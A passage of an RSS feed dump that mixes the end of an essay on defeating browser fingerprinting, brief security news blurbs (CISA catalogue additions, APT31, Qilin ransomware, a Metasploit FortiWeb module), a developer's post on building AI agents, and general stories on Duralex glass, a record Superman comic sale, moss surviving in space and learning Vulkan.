can break websites that rely on them for normal operation.All in all, browser fingerprinting is very hard to defeat, and
organizations that want to track us have gotten disturbingly good at
it.Before sinking into despondency, it’s worth bearing in mind that
websites that attempt to demonstrate the efficacy of fingerprinting,
like amiunique and fingerprint.com do not reflect how
fingerprinting works in the real world. They’re operating on
comparatively small sets of data and, for the most part, they’re not
tracking users over days. Real-world tracking is much harder than these
sites make it out to be. That’s not to say it’s  hard but it
is, at best, a statistical approach, rather than an exact one.In addition ‘uniqueness’, in itself, is not a strong measure of
traceability. That my browser fingerprint is unique at some point in
time is irrelevant if my fingerprint will be different tomorrow, whether
it remains unique within the fingerprinter’s database or not.Of course, these facts also mean that it’s difficult to assess the
effectiveness of our countermeasures: our assessment can only be
approximate, because we don’t actually know what real fingerprinters are
doing.Another small piece of good news is that browser developers are
starting to realize how much of a hazard fingerprinting is, and to
integrate more robust countermeasures. We don’t necessarily need to
resort to plug-ins and extensions, which are themselves detectable and
become part of the fingerprint. At present, Brave and Mullvad seems to
be doing the most to resist fingerprinting, albeit in different ways.
Librewolf has the same fingerprint resistance as Firefox, but it is
turned on by default. Probably anti-fingerprinting methods will improve
over time but, of course, the fingerprinters will get better at what
they do, too.First, and most obviously, if you care about avoiding tracking, you
 prevent long-lived cookies hanging around in the browser,
and you  use a VPN. Ideally the VPN should rotate its
endpoint regularly.The fact that you’re using a VPN, of course, is something that the
fingerprinters will know, and it is does make you stand out.
Sophisticated fingerprinters won’t be defeated by a VPN alone. But if
you don’t use a VPN, the trackers don’t even  to
fingerprint you: your IP number, combined with a few other bits of
routine information, will identify you immediately, and with
near-certainty.Many browsers can be configured to remove cookies when they seem not
to be in use; Librewolf does this by default, and Firefox and Chrome do
it in ‘incognito’ mode. The downside, of course, is that long-lived
cookies are often used to store authentication status so, if you delete
them, you’ll find yourself having to log in every time you look at a
site that requires authentication. To mitigate this annoyance, browsers
generally allow particular sites to be excluded from their
cookie-burning policies.Next, you need to be as unremarkable as possible. Fingerprinting is
about uniqueness, so you should use the most popular browser on the most
popular operating system on the kind of hardware you can buy from PC
World. If you’re running the latest Chrome on the latest Windows 11 on a
two-year-old, bog-standard laptop, you’re going to be one of a very
large group. Of course Chrome, being a Google product, has its own
privacy concerns, so you might be better off using a Chromium-based
browser with reduced Google influence, like Brave.You should endeavour to keep your computer in as near its stock
configuration as possible. Don’t install anything (like fonts) that are
reportable by the browser. Don’t install any extensions, and don’t
change any settings. Use the same ‘light’ theme as everybody else, and
use the browser with a maximized window, and always the same size. And
so on.If possible, use a browser that has built-in fingerprint resistance,
like Mullvad or Librewolf (or Firefox with these features turned
on).If you take all these precautions, you can probably reduce the
probability that you can be tracked by you browser fingerprint, over
days or weeks, from about 99% to about 50%.50% is still too high, of course.The downsides of
resisting fingerprintingIf you enable fingerprinting resistance in Firefox, or use Librewolf,
you’ll immediately encounter oddities. Most obviously, every time you
open a new browser window, it will be the same size. Resizing the window
may have odd results, as the browser will try to constrain certain
screen elements to common size multiples. In addition, you won’t be able
to change the theme.You’ll probably find yourself facing more ‘CAPTCHA’ and similar
identity challenges, because your browser will be unknown to the server.
Websites don’t do this out of spite: hacking and fraud are rife on the
Internet, and the operators of web-based services are rightly paranoid
about client behaviour.You’ll likely find that some websites just don’t work properly, in
many small ways: wrong colours, misplaced text, that kind of thing. I’ve
found these issues to be irritations rather than show-stoppers, but you
might discover otherwise.Is browser fingerprinting
legal?The GDPR is, for the most part, technologically neutral, although it
has specific provisions for cookies, which were a significant concern at
the time it was drafted. So far as I know, nobody has yet challenged
browser fingerprinting under the GDPR, even though it seems to violate
the provisions regarding consent. Since there are legitimate reasons for
fingerprinting, such as hacking detection, organizations that do it
could perhaps defend against a legal challenge on the basis that
fingerprinting is necessary to operate their services safely. In the
end, we really need specific, new legislation to address this privacy
threat.I suspect that many people who take an interest in Internet privacy
don’t appreciate how hard it is to resist browser fingerprinting. Taking
steps to reduce it leads to inconvenience and, with the present state of
technology, even the most intrusive approaches are only partially
effective. The data collected by fingerprinting is invisible to the
user, and stored somewhere beyond the user’s reach.On the other hand, browser fingerprinting produces only statistical
results, and usually can’t be used to track or identify a user with
certainty. The data it collects has a relatively short lifespan – days
to weeks, not months or years. While it probably can be used for
sinister purposes, my main concern is that it supports the intrusive,
out-of-control online advertising industry, which has made a wasteland
of the Internet.In the end, it’s probably only going to be controlled by legislation
and, even when that happens, the advertisers will seek new ways to make
the Internet even more of a hellscape – they always do.]]></content:encoded></item><item><title>In a U.S. First, New Mexico Opens Doors to Free Child Care for All</title><link>https://www.wsj.com/us-news/in-a-u-s-first-new-mexico-opens-doors-to-free-child-care-for-all-2dfdea96</link><author>nairteashop</author><category>dev</category><pubDate>Sat, 22 Nov 2025 16:11:12 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Critical Oracle Identity Manager Vulnerability Added to CISA KEV Catalog</title><link>https://thecyberthrone.in/2025/11/22/critical-oracle-identity-manager-vulnerability-added-to-cisa-kev-catalog/</link><author></author><category>security</category><pubDate>Sat, 22 Nov 2025 15:48:53 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            November 22, 2025CISA officially added a critical vulnerability, CVE-2025-61757, to its Known Exploited Vulnerabilities (KEV) catalog, underscoring the urgent need for organizations using Oracle Ident ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>China-Linked APT31 Launches Stealthy Cyberattacks on Russian IT Using Cloud Services</title><link>https://thehackernews.com/2025/11/china-linked-apt31-launches-stealthy.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0ApbbGy1VeM3uMCY8dVuTIzKS2QJ1wsy4n57G1cLRnEfWcZ2UIsRx8AhTUv8lqBkZb3CQPhalZOTRXo1E8A8LR8EHjecR51E7dgfDI_mHhTYmYulkhNmv82ET56xgGl3qaT7so9t02M3e1JB9pxi_0HCX9cRYUP7qPn9wAg9Yv3JBDj8zpY7bPRuO41rc/s1600/russia.jpg" length="" type=""/><pubDate>Sat, 22 Nov 2025 15:19:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The China-linked advanced persistent threat (APT) group known as APT31 has been attributed to cyber attacks targeting the Russian information technology (IT) sector between 2024 and 2025 while staying undetected for extended periods of time.
"In the period from 2024 to 2025, the Russian IT sector, especially companies working as contractors and integrators of solutions for government agencies,]]></content:encoded></item><item><title>Cox Enterprises discloses Oracle E-Business Suite data breach</title><link>https://www.bleepingcomputer.com/news/security/cox-enterprises-discloses-oracle-e-business-suite-data-breach/</link><author>Bill Toulas</author><category>security</category><pubDate>Sat, 22 Nov 2025 15:16:23 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Cox Enterprises is notifying impacted individuals of a data breach that exposed their personal data to hackers who breached the company network after exploiting a zero-day flaw in Oracle E-Business Suite. [...]]]></content:encoded></item><item><title>&apos;The French people want to save us&apos;: help pours in for glassmaker Duralex</title><link>https://www.theguardian.com/world/2025/nov/22/french-people-want-to-save-us-help-pours-glassmaker-duralex</link><author>n1b0m</author><category>dev</category><pubDate>Sat, 22 Nov 2025 15:14:45 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[rop a Duralex glass and it will most likely bounce, not break. The French company itself has tumbled several times in the past two decades and always bounced back, but never quite as spectacularly as when, earlier this month, it asked the public for money.An appeal for €5m (£4.4m) of emergency funding to secure the immediate future of the glassworks took just five hours and 40 minutes to reach its target. Within 48 hours, the total amount pledged had topped €19m.François Marciano, 59, the director general of Duralex, said the response had astonished everyone at the company. “We thought it would take five or six weeks to raise the €5m. When it reached nearly €20m we had to say stop. Enough,” he said.As a staff cooperative, €5m is the maximum Duralex can accept in public investment under financial rules.Mention Duralex to any French person and they will be transported back to childhood and a school canteen. The brand evokes a mix of nostalgia and pride and is a symbol of French patriotism and industrial “We’re like Proust’s madeleines,” Marciano said. “The French people want to save us. They are fed up with factories closing and the country’s industries declining.”At the Duralex factory on an industrial estate in La Chapelle-Saint-Mesmin on the banks of the Loire just outside Orléans, Marciano says he and his colleagues are “floating on a cloud” after the appeal.Eighteen months ago, Marciano oversaw a staff buyout of the company, which had been placed in receivership for the fourth time in 20 years. Today, 180 of the 243 employees are “associates” in the company.Suliman El Moussaoui, 44, a union representative at the factory where he has worked for 18 years, said the appeal had prompted “a tsunami of orders, so many that we’re struggling to keep up. Every time the company is mentioned on the television or radio we have more orders. It’s been amazing.”Inside the factory, a simple but magical alchemy takes place. A mix of sand, soda ash and limestone, the exact proportions of which are a closely guarded secret, is heated in a vast overhead oven to 1,400C. Glowing globs of molten glass drop into iron casts that are blasted with a flame of gas. The red-hot glass is instantly pounded into shape, sprung from the mould, snatched by metal pincers and placed on a conveyor belt.The process has changed little since Duralex – which is said to take its name from the Latin expression , meaning “the law is harsh, but it is the law” – opened in 1945. When the Guardian visited, the production line was turning out small clear glasses in the Provence range.A worker brandishing tongs lifted a glass to the light to inspect it for faults. During a production run, more than a dozen samples of whatever is being made – glasses, plates, bowls – will be randomly removed and subjected to stress tests. In the quality control room, they will be heated to 150C then plunged into cold water to see if they resist a thermic shock, and dropped from the height of a kitchen counter on to a metal sheet to see if they shatter. They will be tested for stackability and then weighed and the glass thickness measured. If they pass, they are thrown in a bin and the production line is given a thumbs up. If they fail, everything stops and the machines are recalibrated.‘The ultimate drinking vessel’It is not known who invented the company’s trademark Picardie glass, the tumbler used in school canteens with a thick curved rim and semi-fluted shape that first appeared in 1954. The British design guru Patrick Taylor has ranked the Picardie alongside Levi’s jeans and the Swiss Army knife as an icon of modern design. Taylor describes it as: “An object whose form gives the impression it was discovered rather than designed. It is the ultimate drinking vessel created by man, and of its type cannot be improved.”Duralex says its glass is microwave, freezer and dishwasher-safe and will not turn cloudy or lose its colour, which is in the glass rather than on it. When they do break, Duralex glasses shatter into small pieces rather than shards, reducing the injury risk.Joël Cardon, 59, who has worked at the factory for 35 years, said the soaring cost of gas and electricity were the firm’s largest and most worrying expense.On his screen, the oven containing the liquid glass showed a temperature of 1,440C. It can never be allowed to cool or the glass will solidify. Another screen showed the factory was using 360 cubic metres of gas an hour. According to the regulator Ofgem, the average UK house uses 97.3 cubic metres of gas a year.Last weekend, potential investors were asked to come good on their promises on a first come, first served basis. They will be issued with securities that pay 8% interest over seven years but give no company voting rights. The maximum investment was set at €1,000.“We want to involve as many people as possible but with almost €20m in pledges obviously some people will be disappointed,” Marciano said.Since the company became a staff cooperative, turnover has increased by 22% and Marciano said he hoped Duralex would be breaking even by 2027.The €5m raised will be used to modernise the factory and develop new products. These include a partnership with the Élysée presidential palace shop to sell a set of three of its Gigogne glasses in red, white and blue, marked RF for République Française.Duralex plans to commission moulds to make “pint” glasses with a measure line for British pubs and bars and the US, both regions identified by the company as untapped markets.“Selling abroad is more difficult because there isn’t the same nostalgia for Duralex as there is in France,” said Vincent Vallin, the head of strategy and development. “Interest in the company is high and this is positive, but now we have to focus on increasing sales.”]]></content:encoded></item><item><title>Piecing Together the Puzzle: A Qilin Ransomware Investigation</title><link>https://www.bleepingcomputer.com/news/security/piecing-together-the-puzzle-a-qilin-ransomware-investigation/</link><author>Sponsored by Huntress Labs</author><category>security</category><pubDate>Sat, 22 Nov 2025 13:45:53 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Huntress analysts reconstructed a Qilin ransomware attack from a single endpoint, using limited logs to reveal rogue ScreenConnect access, failed infostealer attempts, and the ransomware execution path. The investigation shows how validating multiple data sources can uncover activity even when visibility is reduced to a "pinhole." [...]]]></content:encoded></item><item><title>Cyberattack disables Onsolve Code Red emergency alert system across St. Louis region (1)</title><link>https://databreaches.net/2025/11/22/cyberattack-disables-onsolve-code-red-emergency-alert-system-across-st-louis-region/?pk_campaign=feed&amp;pk_kwd=cyberattack-disables-onsolve-code-red-emergency-alert-system-across-st-louis-region</link><author>Dissent</author><category>databreach</category><pubDate>Sat, 22 Nov 2025 12:16:22 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Agent design is still hard</title><link>https://lucumr.pocoo.org/2025/11/21/agents-are-hard/</link><author>the_mitsuhiko</author><category>dev</category><pubDate>Sat, 22 Nov 2025 11:27:24 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[written on November 21, 2025I felt like it might be a good time to write about some new things I’ve
learned.  Most of this is going to be about building agents, with a little bit
about using agentic coding tools.TL;DR: Building agents is still messy.  SDK abstractions break once you hit
real tool use.  Caching works better when you manage it yourself, but differs
between models.  Reinforcement ends up doing more heavy lifting than expected,
and failures need strict isolation to avoid derailing the loop.  Shared state
via a file-system-like layer is an important building block.  Output tooling is
surprisingly tricky, and model choice still depends on the task.Which Agent SDK To Target?When you build your own agent, you have the choice of targeting an underlying
SDK like the OpenAI SDK or the Anthropic SDK, or you can go with a higher level
abstraction such as the Vercel AI SDK or Pydantic.  The choice we made a while
back was to adopt the Vercel AI SDK but only the provider abstractions, and to
basically drive the agent loop
ourselves.  At this point
we would not make that choice again.  There is
absolutely nothing wrong with the Vercel AI SDK, but when you are trying to
build an agent, two things happen that we originally didn’t anticipate:The first is that the differences between models are significant enough that
you will need to build your own agent abstraction.  We have not found any of
the solutions from these SDKs that build the right abstraction for an agent.  I
think this is partly because, despite the basic agent design being just a loop,
there are subtle differences based on the tools you provide.  These differences
affect how easy or hard it is to find the right abstraction (cache control,
different requirements for reinforcement, tool prompts, provider-side tools,
etc.).  Because the right abstraction is not yet clear, using the original SDKs
from the dedicated platforms keeps you fully in control.  With some of these
higher-level SDKs you have to build on top of their existing abstractions,
which might not be the ones you actually want in the end.We also found it incredibly challenging to work with the Vercel SDK when it
comes to dealing with provider-side tools.  The attempted unification of
messaging formats doesn’t quite work.  For instance, the web search tool from
Anthropic routinely destroys the message history with the Vercel SDK, and we
haven’t yet fully figured out the cause.  Also, in Anthropic’s case, cache
management is much easier when targeting their SDK directly instead of the
Vercel one.  The error messages when you get things wrong are much clearer.This might change, but right now we would probably not use an abstraction when
building an agent, at least until things have settled down a bit.  The benefits
do not yet outweigh the costs for us.Someone else might have figured it out.  If you’re reading this and think I’m
wrong, please drop me a mail.  I want to learn.The different platforms have very different approaches to caching.  A lot has
been said about this already, but Anthropic makes you pay for caching.  It
makes you manage cache points explicitly, and this really changes the way you
interact with it from an agent engineering level.  I initially found the manual
management pretty dumb.  Why doesn’t the platform do this for me?  But I’ve
fully come around and now vastly prefer explicit cache management.  It makes
costs and cache utilization much more predictable.Explicit caching allows you to do certain things that are much harder
otherwise.  For instance, you can split off a conversation and have it run in
two different directions simultaneously.  You also have the opportunity to do
context editing.  The optimal strategy here is unclear, but you clearly have a
lot more control, and I really like having that control.  It also makes it much
easier to understand the cost of the underlying agent.  You can assume much
more about how well your cache will be utilized, whereas with other platforms
we found it to be hit and miss.The way we do caching in the agent with Anthropic is pretty straightforward.
One cache point is after the system prompt.  Two cache points are placed at the
beginning of the conversation, where the last one moves up with the tail of the
conversation.  And then there is some optimization along the way that you can
do.Because the system prompt and the tool selection now have to be mostly static,
we feed a dynamic message later to provide information such as the current
time.  Otherwise, this would trash the cache.  We also leverage reinforcement
during the loop much more.Reinforcement In The Agent LoopEvery time the agent runs a tool you have the opportunity to not just return
data that the tool produces, but also to feed more information back into the
loop.  For instance, you can remind the agent about the overall objective and
the status of individual tasks.  You can also provide hints about how the tool
call might succeed when a tool fails.  Another use of reinforcement is to
inform the system about state changes that happened in the background.  If you
have an agent that uses parallel processing, you can inject information after
every tool call when that state changed and when it is relevant for completing
the task.Sometimes it’s enough for the agent to self-reinforce.  In Claude Code, for
instance, the todo write tool is a self-reinforcement tool.  All it does is
take from the agent a list of tasks that it thinks it should do and echo out
what came in.  It’s basically just an echo tool; it really doesn’t do anything
else.  But that is enough to drive the agent forward better than if the only
task and subtask were given at the beginning of the context and too much has
happened in the meantime.We also use reinforcements to inform the system if the environment changed
during execution in a way that’s problematic for the agent.  For instance, if
our agent fails and retries from a certain step forward but the recovery
operates off broken data, we inject a message informing it that it might want
to back off a couple of steps and redo an earlier step.If you expect a lot of failures during code execution, there is an opportunity
to hide those failures from the context.  This can happen in two ways.  One is
to run tasks that might require iteration individually.  You would run them in
a subagent until they succeed and only report back the success, plus maybe a
brief summary of approaches that did not work.  It is helpful for an agent to
learn about what did not work in a subtask because it can then feed that
information into the next task to hopefully steer away from those failures.The second option doesn’t exist in all agents or foundation models, but with
Anthropic you can do context editing.  So far we haven’t had a lot of success
with context editing, but we believe it’s an interesting thing we would love to
explore more.  We would also love to learn if people have success with it.
What is interesting about context editing is that you should be able to
preserve tokens for further down the iteration loop.  You can take out of the
context certain failures that didn’t drive towards successful completion of the
loop, but only negatively affected certain attempts during execution.  But as
with the point I made earlier: it is also useful for the agent to understand
what didn’t work, but maybe it doesn’t require the full state and full output
of all the failures.Unfortunately, context editing will automatically invalidate caches.  There is
really no way around it.  So it can be unclear when the trade-off of doing that
compensates for the extra cost of trashing the cache.Sub Agents / Sub InferenceAs I mentioned a couple of times on this blog already, most of our agents are
based on code execution and code generation.  That really requires a common
place for the agent to store data.  Our choice is a file system—in our case a
virtual file system—but that requires different tools to access it.  This is
particularly important if you have something like a subagent or subinference.You should try to build an agent that doesn’t have dead ends.  A dead end is
where a task can only continue executing within the sub-tool that you built.
For instance, you might build a tool that generates an image, but is only able
to feed that image back into one more tool.  That’s a problem because you might
then want to put those images into a zip archive using the code execution tool.
So there needs to be a system that allows the image generation tool to write
the image to the same place where the code execution tool can read it.  In
essence, that’s a file system.Obviously it has to go the other way around too.  You might want to use the
code execution tool to unpack a zip archive and then go back to inference to
describe all the images so that the next step can go back to code execution and
so forth.  The file system is the mechanism that we use for that.  But it does
require tools to be built in a way that they can take file paths to the virtual
file system to work with.So basically an  tool would have access to the same file system as
the  tool which could take a  to a file on that same
virtual file system.The Use Of An Output ToolOne interesting thing about how we structured our agent is that it does not
represent a chat session.  It will eventually communicate something to the user
or the outside world, but all the messages that it sends in between are usually
not revealed.  The question is: how does it create that message?  We have one
tool which is the output tool.  The agent uses it explicitly to communicate to
the human.  We then use a prompt to instruct it when to use that tool.  In our
case the output tool sends an email.But that turns out to pose a few other challenges.  One is that it’s
surprisingly hard to steer the wording and tone of that output tool compared to
just using the main agent loop’s text output as the mechanism to talk to the
user.  I cannot say why this is, but I think it’s probably related to how these
models are trained.One attempt that didn’t work well was to have the output tool run another quick
LLM like Gemini 2.5 Flash to adjust the tone to our preference.  But this
increases latency and actually reduces the quality of the output.  In part, I
think the model just doesn’t word things correctly and the subtool doesn’t have
sufficient context.  Providing more slices of the main agentic context into the
subtool makes it expensive and also didn’t fully solve the problem.  It also
sometimes reveals information in the final output that we didn’t want to be
there, like the steps that led to the end result.Another problem with an output tool is that sometimes it just doesn’t call the
tool.  One of the ways in which we’re forcing this is we remember if the output
tool was called.  If the loop ends without the output tool, we inject a
reinforcement message to encourage it to use the output tool.Overall our choices for models haven’t dramatically changed so far.  I think
Haiku and Sonnet are still the best tool callers available, so they make for
excellent choices in the agent loop.  They are also somewhat transparent with
regards to what the RL looks like.  The other obvious choices are the Gemini
models.  We so far haven’t found a ton of success with the GPT family of models
for the main loop.For the individual sub-tools, which in part might also require inference, our
current choice is Gemini 2.5 if you need to summarize large documents or work
with PDFs and things like that.  That is also a pretty good model for
extracting information from images, in particular because the Sonnet family of
models likes to run into a safety filter which can be annoying.There’s also probably the very obvious realization that token cost alone
doesn’t really define how expensive an agent.  A better tool caller will do the
job in fewer tokens.  There are some cheaper models available than sonnet
today, but they are not  cheaper in a loop.But all things considered, not that much has changed in the last couple of
weeks.We find testing and evals to be the hardest problem here.  This is not entirely
surprising, but the agentic nature makes it even harder.  Unlike prompts, you
cannot just do the evals in some external system because there’s too much you
need to feed into it.  This means you want to do evals based on observability
data or instrumenting your actual test runs.  So far none of the solutions we
have tried have convinced us that they found the right approach here.
Unfortunately, I have to report that at the moment we haven’t found something
that really makes us happy.  I hope we’re going to find a solution for this
because it is becoming an increasingly frustrating aspect of building an agent.As for my experience with coding agents, not really all that much has changed.
The main new development is that I’m trialing Amp more.
In case you’re curious why: it’s not that it’s objectively a better agent than
what I’m using, but I really quite like the way they’re thinking about agents
from what they’re posting.  The interactions of the different sub agents like
the Oracle with the main loop is beautifully done, and not many other harnesses
do this today.  It’s also a good way for me to validate how different agent
designs work.  Amp, similar to Claude Code, really feels like a product built
by people who also use their own tool.  I do not feel every other agent in the
industry does this.Quick Stuff I Read And FoundThat’s just a random assortment of things that I feel might also be worth
sharing:What if you don’t need MCP at
all?:
Mario argues that many MCP servers are overengineered and include large
toolsets that consume lots of context.  He proposes a minimalist approach for
browser-agent use-cases by relying on simple CLI tools (e.g., start, navigate,
evaluate JS, screenshot) executed via Bash, which keeps token usage small and
workflows flexible.  I built a Claude/Amp Skill out of
it.The fate of “small” open
source:
The author argues that the age of tiny, single-purpose open-source libraries is
coming to an end, largely because built-in platform APIs and AI tools can now
generate simple utilities on demand.  Thank fucking
god.Tmux is love.  There is
no article that goes with it, but the TLDR is that Tmux is great.  If you
have anything that remotely looks like an interactive system that an agent
should work with, you should give it some Tmux
skills.]]></content:encoded></item><item><title>VS meldt actief misbruik van kritiek RCE-lek in Oracle Identity Manager</title><link>https://www.security.nl/posting/914041/VS+meldt+actief+misbruik+van+kritiek+RCE-lek+in+Oracle+Identity+Manager?channel=rss</link><author></author><category>security</category><pubDate>Sat, 22 Nov 2025 07:13:31 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            Aanvallers maken actief misbruik van een kritieke kwetsbaarheid in Oracle Identity Manager, zo laat het Amerikaanse cyberagentschap CISA weten. Gisteren verscheen er berichtgeving dat het beveiligings ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Matrix Push C2 Uses Browser Notifications for Fileless, Cross-Platform Phishing Attacks</title><link>https://thehackernews.com/2025/11/matrix-push-c2-uses-browser.html</link><author></author><category>security</category><pubDate>Sat, 22 Nov 2025 06:47:00 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            Bad actors are leveraging browser notifications as a vector for phishing attacks to distribute malicious links by means of a new command-and-control (C2) platform called Matrix Push C2.
"This browser- ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>CISA Warns of Actively Exploited Critical Oracle Identity Manager Zero-Day Vulnerability</title><link>https://thehackernews.com/2025/11/cisa-warns-of-actively-exploited.html</link><author></author><category>security</category><pubDate>Sat, 22 Nov 2025 06:45:00 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            Nov 22, 2025Ravie LakshmananZero-Day / Software Security
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Friday added a critical security flaw impacting Oracle Identity Manager t ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Metasploit Adds Exploit Module for Recently Disclosed FortiWeb 0-Day Vulnerabilities</title><link>https://cybersecuritynews.com/metasploit-module-fortiweb-0-day/</link><author></author><category>security</category><pubDate>Sat, 22 Nov 2025 06:29:43 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            The Metasploit Framework has introduced a new exploit module targeting critical vulnerabilities in Fortinet’s FortiWeb Web Application Firewall (WAF).
This module chains two recently disclosed flaws,  ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Original Superman comic becomes the highest-priced comic book ever sold</title><link>https://www.bbc.com/news/articles/c8e9rp0knj6o</link><author>1659447091</author><category>dev</category><pubDate>Sat, 22 Nov 2025 05:21:53 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[While cleaning out their late mother's California loft last Christmas, three brothers made a life-changing discovery under a pile of faded newspapers: one of the first Superman comics ever made. An original copy of the June 1939 first edition on the Man of Steel's adventures, it was in a remarkably pristine condition.Now it has become the highest-priced comic book ever sold, fetching $9.12m (£7m) at auction.  Texas-based Heritage Auctions, which hosted Thursday's sale, called it the "pinnacle of comic collecting".The brothers found six comic books, including Superman #1, in the loft underneath a stack of newspapers inside a cardboard box and surrounded by cobwebs in 2024, Heritage said. They waited a few months before contacting the auction house, but once they did, Heritage Auctions vice-president Lon Allen visited them in San Francisco within days, according to the auction house. The brothers, who have chosen to withhold their names, are "in their 50s and 60s, and their mom had always told them she had an expensive comics collection but never showed them", Mr Allen said. "It's a twist on the old 'Mom threw away my comics' story."Their mother had held onto the comic books since she and her brother bought them between the Great Depression and the beginning of World War Two, Heritage said.Mr Allen added that the cool northern California climate was perfect for preserving old paper. "If it had been in an attic here in Texas, it would have been ruined," he said.That helped CGC, a large third-party comics grading service, give this copy of Superman #1 a 9.0 rating on a 10-point scale, topping the previous record of 8.5. And at its sale price of over $9m, including buyer's premium, Superman #1 easily beat the previous highest-priced comic book ever sold by $3m. Action Comics No. 1, the 1938 work that first introduced Superman, sold for $6m last year.The youngest brother said in a press release by the auction house that the box had remained forgotten in the back of attic. "As the years unfolded, life brought about a series of losses and changes," he said. "The demands of everyday survival took centre stage, and the box of comics, once set aside with care and intention, was forgotten. Until last Christmas."He added: "This isn't simply a story about old paper and ink. This was never just about a collectible. "This is a testament to memory, family and the unexpected ways the past finds its way back to us."]]></content:encoded></item><item><title>Moss Survives 9 Months in Space Vacuum</title><link>https://scienceclock.com/moss-survives-9-months-in-space-vacuum/</link><author>ashishgupta2209</author><category>dev</category><pubDate>Sat, 22 Nov 2025 03:57:29 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Mosses are already known for coping with harsh radiation, dehydration, and long freezes. Now scientists have pushed them even further by exposing their spore capsules to open space for nine months, and most of them survived.The team worked with spreading earthmoss (), a small moss species used widely as a plant model by researchers. Its spore-containing capsules were mounted on the outside of the International Space Station (ISS), where they experienced direct solar radiation, vacuum conditions, and sharp temperature swings during each orbit.Under those conditions, cells usually break down quickly. So the researchers were surprised by what came back. “We expected almost zero survival, but the result was the opposite,” says Hokkaido University biologist Tomomichi Fujita. More than 80 percent of the spores still germinated once they returned to Earth.The team detected a small drop in chlorophyll a, but the other pigments remained stable. The spores grew normally in follow-up tests, showing no signs of major stress from their time in orbit.This kind of toughness fits with the evolutionary history of mosses. Bryophytes — the group that includes mosses, liverworts, and hornworts — were among the first plants to move from water onto land about 500 million years ago. Their spores had to withstand drying and direct sunlight long before soils existed, which may explain why their protective structures still hold up so well today.The results place moss spores alongside the few organisms known to tolerate direct space exposure, including tardigrades and certain microbes. Their survival also adds to ongoing discussions about what types of life might endure extreme environments beyond Earth.According to the researchers, this durability could matter for future experiments on the Moon or Mars. Mosses need very little soil and can pull nutrients directly from rock, making them candidates for early ecosystem tests in extraterrestrial settings.“Ultimately, we hope this work opens a new frontier toward constructing ecosystems in extraterrestrial environments such as the Moon and Mars,” says Fujita.The research was published in . Read the study here.]]></content:encoded></item><item><title>SolarWinds Serv-U Critical Vulnerabilities</title><link>https://thecyberthrone.in/2025/11/22/solarwinds-serv-u-critical-vulnerabilities/</link><author></author><category>security</category><pubDate>Sat, 22 Nov 2025 02:44:55 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            In November 2025, SolarWinds released an urgent security patch addressing a trio of critical remote code execution (RCE) vulnerabilities in its widely used Serv-U managed file transfer software. These ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>SonicWall Patches Two Vulnerabilities in Email Security Appliances, Including Code Execution Flaw (CVE-2025-40604)</title><link>https://securityonline.info/sonicwall-patches-two-vulnerabilities-in-email-security-appliances-including-code-execution-flaw-cve-2025-40604/</link><author></author><category>security</category><pubDate>Sat, 22 Nov 2025 00:00:36 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            SonicWall has released security updates addressing two vulnerabilities in its Email Security appliances, including one that could allow persistent arbitrary code execution if exploited. The flaws—CVE- ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>CISA warns Oracle Identity Manager RCE flaw is being actively exploited</title><link>https://www.bleepingcomputer.com/news/security/cisa-warns-oracle-identity-manager-rce-flaw-is-being-actively-exploited/</link><author>Lawrence Abrams</author><category>security</category><pubDate>Fri, 21 Nov 2025 23:50:27 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[The U.S. Cybersecurity & Infrastructure Security Agency (CISA) is warning government agencies to patch an Oracle Identity Manager tracked as CVE-2025-61757 that has been exploited in attacks, potentially as a zero-day. [...]]]></content:encoded></item><item><title>How I learned Vulkan and wrote a small game engine with it (2024)</title><link>https://edw.is/learning-vulkan/</link><author>jakogut</author><category>dev</category><pubDate>Fri, 21 Nov 2025 23:28:40 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[: I learned some Vulkan and made a game engine with two small game demos in 3 months.This article documents my experience of learning Vulkan and writing a small game/engine with it. It took me around 3 months to do it without any previous knowledge of Vulkan (I had previous OpenGL experience and some experience with making game engines, though).The engine wasn’t implemented as a general purpose engine, which is probably why it took me a few months (and not years) to achieve this. I started by making a small 3D game and separated reusable parts into the “engine” afterwards. I can recommend everyone to follow the same process to not get stuck in the weeds (see “Bike-shedding” section below for more advice).I’m a professional programmer, but I’m self-taught in graphics programming. I started 